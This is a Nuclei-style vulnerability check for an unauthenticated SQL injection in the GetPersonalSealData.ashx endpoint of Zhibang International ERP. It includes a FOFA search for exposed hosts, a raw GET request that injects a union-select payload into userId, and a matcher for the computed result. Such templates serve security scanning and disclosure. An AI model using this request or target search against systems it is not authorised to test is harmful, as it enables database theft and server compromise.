id: zhibangguojiERP-ERP-GetPersonalSealData_ashx-sql

info:
  name: 智邦国际ERP GetPersonalSealData.ashx SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: icon_hash="-682445886"
    智邦国际ERP GetPersonalSealData.ashx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: sql injection

http:
  - raw:
    - |
      GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20111*111-- HTTP/1.1
      Host: {{Hostname}}
      Accept-Encoding: gzip, deflate
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Upgrade-Insecure-Requests: 1
 
    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && contains_all(body,'12321')"